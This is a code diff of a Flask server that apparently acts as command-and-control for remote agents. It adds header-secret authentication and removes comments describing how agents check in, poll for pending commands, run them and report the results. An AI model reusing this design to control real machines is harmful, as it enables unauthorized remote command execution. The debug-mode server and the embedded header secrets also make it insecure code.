@@ -13,7 +13,10 @@ app = Flask(__name__)
 
 app.config['JWT_SECRET_KEY'] = sys.argv[5] # json web token is set in setup.sh
 jwt = JWTManager(app)
-
+user_agent_secret = sys.argv[6]
+agent_secret = sys.argv[7]
+#user_agent_secret = "QmxhY2tUYWJieQo="
+#agent_secret = "TGVhcm5pbmdDVG9CRWxpdGUK"
 
 def generate_token(agent_id):
 	access_token = create_access_token(identity=agent_id)
@@ -79,9 +82,9 @@ def first_checkin():
 	if not request.is_json:
 		return jsonify({"Error":"Unauthorized"})
 	print
-	if headers.get("User-Agent") != "QmxhY2tUYWJieQo=": ### BlackTabby Base64 Encoded
+	if headers.get("User-Agent") != user_agent_secret: ### BlackTabby Base64 Encoded
 		return jsonify({"Error":"Unauthorized"})
-	if headers.get("Agent") != "TGVhcm5pbmdDVG9CRWxpdGUK": ###Base64 LearningCToBElite
+	if headers.get("Agent") != agent_secret: ###Base64 LearningCToBElite
 		return jsonify({"Error":"Unauthorized"})
 	## gather parameters from json ##
 	print(request.get_json())
@@ -121,44 +124,3 @@ app.run(host='0.0.0.0',debug=True,port=9000,ssl_context='adhoc')
 
 
 
-
-'''
-	IF AUTH WORKS, PERFORM FIRST CHECK_IN
-	FIRST CHECK_IN SENDS INITIAL DATA TO DATABASE
-	AFTER THAT AGENT WILL POLL THIS APPLICATION ON THE /polling route
-	for new commands
-
-
-AGENT -> POST -> /first_check_in
-^^^
-Agent first checks in, he authenticates now hes in the database and can be controlled via the cli app
-he is assigned a token that is used for subesquent requests
-
-AGENT -> GET -> /polling 
-
-Agent is now polling this app every 5 seconds waiting for something to show in the pending commands array
-if something is there agent will run that command 
-
-AGENT -> POST ->/polling
-after a command is gotten via the get request if it is successfully ran it will 
-POST the results of the command to the database via POST request to poll 
-
-then it will go back to polling /get via get
-
-'''
-
-
-
-
-
-
-
-# json format always
-'''
-    	agent_id: int
-    	OS: str
-    	ip: str
-    	user: str
-    	completed_commands: list of dictionary
-  	  	pending_commands:list of strings
-  '''
